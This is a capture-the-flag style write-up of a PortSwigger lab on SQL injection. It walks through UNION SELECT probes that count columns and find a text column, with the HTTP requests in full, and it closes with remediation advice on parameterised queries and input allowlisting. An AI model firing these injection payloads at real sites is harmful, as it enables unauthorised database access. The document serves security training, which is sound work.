# SQL Injection UNION Attack — Finding a Column Containing Text

![Platform](https://img.shields.io/badge/Platform-PortSwigger%20Web%20Security%20Academy-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-brightgreen)
![Category](https://img.shields.io/badge/Category-SQL%20Injection-red)
![Technique](https://img.shields.io/badge/Technique-UNION%20Based-blue)
![Status](https://img.shields.io/badge/Status-Solved-success)
![OWASP](https://img.shields.io/badge/OWASP-A03%3A2021%20Injection-critical)
![MITRE](https://img.shields.io/badge/MITRE-T1190-red)

---

## Table of Contents

- [Overview](#overview)
- [Scope and Objectives](#scope-and-objectives)
- [Methodology](#methodology)
- [Findings](#findings)
- [Attack Chain](#attack-chain)
- [Tools and Environment](#tools-and-environment)
- [Evidence](#evidence)
- [Remediation Strategy](#remediation-strategy)
- [Lessons Learned](#lessons-learned)
- [References](#references)
- [Author](#author)

---

## Overview

This writeup documents the exploitation of a SQL injection vulnerability in the product category filter of a PortSwigger Web Security Academy lab. The application passes unsanitised user input directly into a SQL query and reflects the query results in the HTTP response, enabling a UNION-based injection attack.

The objective of this lab was to determine the number of columns returned by the vulnerable query and identify which column is compatible with string data — a prerequisite for extracting meaningful string data from other database tables via UNION injection. The lab was solved by injecting a controlled string value (`WqlUZk`) into the second column of a three-column result set.

This technique is foundational to advanced SQL injection data exfiltration and maps to **CWE-89**, **OWASP A03:2021 — Injection**, and **MITRE ATT&CK T1190 — Exploit Public-Facing Application**.

---

## Scope and Objectives

### Scope

| Item                | Detail                                                              |
| ------------------- | ------------------------------------------------------------------- |
| Target Application  | PortSwigger Web Security Academy Lab                                |
| Lab URL             | `https://0a4500c50355e621810c7a6c00e100dd.web-security-academy.net` |
| Vulnerable Endpoint | `/filter?category=`                                                 |
| Parameter           | `category` (GET)                                                    |
| Environment         | Isolated, sandboxed lab environment                                 |
| Authorisation       | Fully authorised — sanctioned training platform                     |

### Out of Scope

- Any system outside the assigned lab domain
- Persistent data modification beyond solving the lab objective
- Denial-of-service or destructive payloads

### Objectives

1. Confirm the presence of a SQL injection vulnerability in the `category` parameter.
2. Determine the number of columns returned by the backend query using `ORDER BY` or `UNION SELECT NULL` probing.
3. Identify which column(s) accept string data by substituting `NULL` values with a controlled string.
4. Deliver the lab-supplied random value (`WqlUZk`) in the query results to confirm string-compatible column identification.

---

## Methodology

This assessment follows the **PTES (Penetration Testing Execution Standard)** and references the **OWASP Testing Guide v4.2**, specifically **WSTG-INPV-05 — Testing for SQL Injection**.

### Phase 1 — Reconnaissance and Injection Point Identification

HTTP traffic to the `/filter` endpoint was intercepted using Burp Suite Proxy. The `category` parameter was identified as the injection point based on its direct inclusion in a backend SQL query, evidenced by application error responses and result changes when the parameter value was manipulated.

### Phase 2 — Column Count Enumeration

The number of columns returned by the vulnerable query was determined using incremental `UNION SELECT NULL` payloads. The approach follows the standard technique of appending additional `NULL` values until the response returns successfully without error.

**Payloads tested (column count probe):**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

The application returned a valid response (HTTP 200 with product data) on the third payload, confirming the query returns **three columns**.

**URL-encoded payload used:**

```
/filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL--
```

### Phase 3 — String-Compatible Column Identification

Each `NULL` placeholder was replaced individually with the lab-assigned random string value (`WqlUZk`) to identify which column(s) the application can render as a string.

**Payloads tested (string compatibility probe):**

```sql
' UNION SELECT 'WqlUZk',NULL,NULL--   -- Column 1 test
' UNION SELECT NULL,'WqlUZk',NULL--   -- Column 2 test
' UNION SELECT NULL,NULL,'WqlUZk'--   -- Column 3 test
```

Column 1 returned an error (incompatible data type). Column 2 returned a valid HTTP 200 response with `WqlUZk` reflected in the response body, confirming **Column 2 is string-compatible**. Column 3 was not required after Column 2 succeeded.

**Final solving payload (URL-encoded):**

```
/filter?category=Pets%27+UNION+SELECT+NULL,%27WqlUZk%27,NULL--+
```

---

## Findings

### FINDING-001 — SQL Injection via UNION Attack in Category Filter

| Attribute               | Detail                                                                      |
| ----------------------- | --------------------------------------------------------------------------- |
| Finding ID              | FINDING-001                                                                 |
| Severity                | [CRITICAL]                                                                  |
| CVSS v3.1 Score         | 9.8                                                                         |
| CVSS v3.1 Vector        | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`                              |
| CWE                     | CWE-89 — Improper Neutralisation of Special Elements used in an SQL Command |
| OWASP Category          | A03:2021 — Injection                                                        |
| MITRE ATT&CK TTP        | T1190 — Exploit Public-Facing Application                                   |
| Affected Component      | `/filter?category=` — HTTP GET parameter                                    |
| Authentication Required | No                                                                          |

#### Description

The `category` parameter in the product filter endpoint is passed directly into a SQL query without parameterisation or input sanitisation. An unauthenticated attacker can inject arbitrary SQL syntax to modify the query structure. Because the application reflects query results in the HTTP response, a UNION-based attack is viable, enabling extraction of data from any table accessible to the database user.

#### Technical Impact

- Full read access to all database tables accessible by the application's database account
- Potential to enumerate database schema, extract credentials, PII, and sensitive business data
- Depending on database user privileges: potential for data modification (`INSERT`, `UPDATE`, `DELETE`) or operating system interaction (`xp_cmdshell` on MSSQL, `INTO OUTFILE` on MySQL)

#### Business Impact

- Unauthorised disclosure of customer data, constituting a data breach under applicable privacy regulations (GDPR, Data Protection Act)
- Exposure of internal application logic, credentials, and infrastructure information
- Reputational and regulatory consequences resulting from exploitation

#### Proof of Concept

The following payload was submitted to the vulnerable endpoint via Burp Suite Repeater:

```
GET /filter?category=Pets%27+UNION+SELECT+NULL,%27WqlUZk%27,NULL--+ HTTP/1.1
Host: 0a4500c50355e621810c7a6c00e100dd.web-security-academy.net
```

The application returned HTTP 200 with the value `WqlUZk` rendered in the response body alongside legitimate product data, confirming successful UNION injection and string-compatible column identification.

#### Reproduction Steps

1. Open Burp Suite and enable the proxy interceptor.
2. Navigate to the target lab URL and browse to any product category.
3. Intercept the GET request to `/filter?category=<value>`.
4. Send the intercepted request to Burp Repeater.
5. Modify the `category` parameter to: `Pets'+UNION+SELECT+NULL,NULL,NULL--`
6. Confirm HTTP 200 response — this establishes the column count as three.
7. Replace `NULL` values one at a time with `'WqlUZk'` to identify the string-compatible column.
8. Final payload: `Pets%27+UNION+SELECT+NULL,%27WqlUZk%27,NULL--+`
9. Observe `WqlUZk` reflected in the response body — lab objective satisfied.

#### Remediation

See [Remediation Strategy](#remediation-strategy).

#### Retest Criteria

The vulnerability is remediated when:

- The payload `' UNION SELECT NULL,NULL,NULL--` returns an application error or empty result set with no SQL error disclosure
- A Web Application Firewall (WAF) or input validation layer blocks the injection attempt before it reaches the database layer
- Parameterised queries are confirmed via code review

---

## Attack Chain

```
[1] RECONNAISSANCE
    Intercept HTTP traffic via Burp Suite Proxy
    Identify GET parameter: /filter?category=
    Observe parameter value reflected in SQL query output
            |
            v
[2] INJECTION POINT CONFIRMATION
    Inject single quote: category=Pets'
    Application returns database error or altered response
    Injection confirmed
            |
            v
[3] COLUMN COUNT ENUMERATION
    Probe with UNION SELECT NULL payloads
    Increment NULL count until HTTP 200 received
    Result: Query returns 3 columns
            |
            v
[4] STRING COMPATIBILITY PROBING
    Substitute NULL values with controlled string 'WqlUZk'
    Column 1: Error (incompatible type)
    Column 2: HTTP 200 — 'WqlUZk' reflected in response
    Column 2 confirmed as string-compatible
            |
            v
[5] OBJECTIVE ACHIEVED
    Final payload delivered:
    Pets%27+UNION+SELECT+NULL,%27WqlUZk%27,NULL--+
    Random value 'WqlUZk' returned in query results
    Lab solved
```

---

## Tools and Environment

| Tool                             | Version | Purpose                                    |
| -------------------------------- | ------- | ------------------------------------------ |
| Burp Suite Community Edition     | Latest  | HTTP proxy, request interception, Repeater |
| Chromium Browser                 | Latest  | Target application navigation              |
| PortSwigger Web Security Academy | —       | Sandboxed lab environment                  |

**Operating System:** Kali Linux (rolling)

**Network:** Isolated lab environment — no external traffic

---

## Evidence

sql-injection/08-sqli-union-finding-a-column-containing-text/evidence/lab-solved.png

### Column Count Confirmation

**Request:**

```http
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
Host: 0a4500c50355e621810c7a6c00e100dd.web-security-academy.net
```

**Outcome:** HTTP 200 — application returned product results, confirming three columns in the query result set.

---

### String Injection — Column 1 (Failure)

**Request:**

```http
GET /filter?category=Pets'+UNION+SELECT+'WqlUZk',NULL,NULL-- HTTP/1.1
Host: 0a4500c50355e621810c7a6c00e100dd.web-security-academy.net
```

**Outcome:** Application error or empty response — Column 1 does not accept string data.

---

### String Injection — Column 2 (Success)

**Request:**

```http
GET /filter?category=Pets%27+UNION+SELECT+NULL,%27WqlUZk%27,NULL--+ HTTP/1.1
Host: 0a4500c50355e621810c7a6c00e100dd.web-security-academy.net
```

**Outcome:** HTTP 200 — value `WqlUZk` reflected in the response body. Column 2 confirmed as string-compatible. Lab objective achieved.

> **Note:** Screenshots from Burp Suite Repeater showing the injected response would be appended here in a full engagement report.

---

## Remediation Strategy

### [IMMEDIATE] Implement Parameterised Queries / Prepared Statements

The root cause of this vulnerability is the direct concatenation of user input into SQL query strings. The fix is to use parameterised queries with bound parameters, which the database engine treats as data — never as executable SQL syntax.

**Example fix (PHP / PDO):**

```php
// Vulnerable pattern
$query = "SELECT * FROM products WHERE category = '" . $_GET['category'] . "'";

// Secure pattern — parameterised query
$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ?");
$stmt->execute([$_GET['category']]);
```

**Example fix (Java / PreparedStatement):**

```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
stmt.setString(1, categoryInput);
```

---

### [IMMEDIATE] Apply Strict Server-Side Input Validation

Validate and allowlist expected input values before they reach query construction logic. For a category filter accepting known category names, validate against a predefined allowlist.

```php
$allowed_categories = ['Gifts', 'Pets', 'Lifestyle', 'Corporate'];
if (!in_array($_GET['category'], $allowed_categories, true)) {
    http_response_code(400);
    exit('Invalid category.');
}
```

---

### [SHORT-TERM] Apply Principle of Least Privilege to Database Accounts

The database account used by the application should be restricted to only the permissions required for normal operation. It should not have access to system tables, metadata schemas, or unrelated application tables.

---

### [SHORT-TERM] Deploy a Web Application Firewall (WAF)

A WAF provides a secondary layer of defence capable of detecting and blocking common SQL injection patterns in HTTP parameters. This is a defence-in-depth measure and must not replace parameterised queries.

---

### [PLANNED] Suppress Database Error Messages in Production Responses

Error-based SQL injection relies on database error messages being returned to the client. Production environments must suppress verbose error output and log errors server-side only.

---

## Lessons Learned

### Technique: UNION-Based Column Count Enumeration

The `UNION SELECT NULL` technique is the standard method for determining the column count of a reflected SQL query. Each iteration adds one `NULL` value until the query executes without error, at which point the count is confirmed. This is a necessary prerequisite to any UNION-based data extraction.

### Technique: String-Compatible Column Identification

Not all columns in a SQL result set accept string data — numeric or date-typed columns will cause a type mismatch error when a string is injected. Probing each column individually with a known controlled string value identifies which columns can be used to extract string data such as usernames, passwords, or configuration values from target tables.

### Operational Note: Burp Suite Intercept Workflow

Intercepting and modifying the `category` parameter in Burp Repeater, rather than modifying the URL directly in the browser, provides greater control over encoding, special characters, and payload formatting — particularly for payloads that include single quotes, spaces, and comment sequences.

### Foundational Relevance

This lab establishes the groundwork for more advanced UNION injection techniques: extracting data from arbitrary tables, enumerating database schema, and exfiltrating credentials. Every technique demonstrated here applies directly to real-world reflected SQL injection scenarios.

---

## References

| Reference                   | Link                                                                                                                                                     |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PortSwigger — SQL Injection | https://portswigger.net/web-security/sql-injection                                                                                                       |
| PortSwigger — UNION Attacks | https://portswigger.net/web-security/sql-injection/union-attacks                                                                                         |
| OWASP A03:2021 — Injection  | https://owasp.org/Top10/A03_2021-Injection/                                                                                                              |
| OWASP WSTG-INPV-05          | https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection |
| CWE-89                      | https://cwe.mitre.org/data/definitions/89.html                                                                                                           |
| MITRE ATT&CK T1190          | https://attack.mitre.org/techniques/T1190/                                                                                                               |
| CVSS v3.1 Calculator        | https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator                                                                                                     |
| NIST SP 800-115             | https://csrc.nist.gov/publications/detail/sp/800/115/final                                                                                               |

---

## Author

**Michael Asante Anim** | `0x1aerixis`
BSc Cyber Security — University of Mines and Technology (UMaT), Tarkwa, Ghana

[![GitHub](https://img.shields.io/badge/GitHub-anim--michael--asante-black?logo=github)](https://github.com/anim-michael-asante)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://linkedin.com/in/michael-asante-anim)
[![TryHackMe](https://img.shields.io/badge/TryHackMe-0x1aerixis-red?logo=tryhackme)](https://tryhackme.com/p/0x1aerixis)
[![X](https://img.shields.io/badge/X-0x1aerixis-black?logo=x)](https://x.com/0x1aerixis)
[![Discord](https://img.shields.io/badge/Discord-0x1aerixis-5865F2?logo=discord)](https://discord.com/users/0x1aerixis)

> _"Built in the lab. Documented for the field."_

---

> **Disclaimer:** All work documented in this repository was conducted in authorized, isolated
> lab environments or sanctioned CTF platforms. No unauthorized systems were accessed.
> This project is intended for educational and portfolio purposes only.
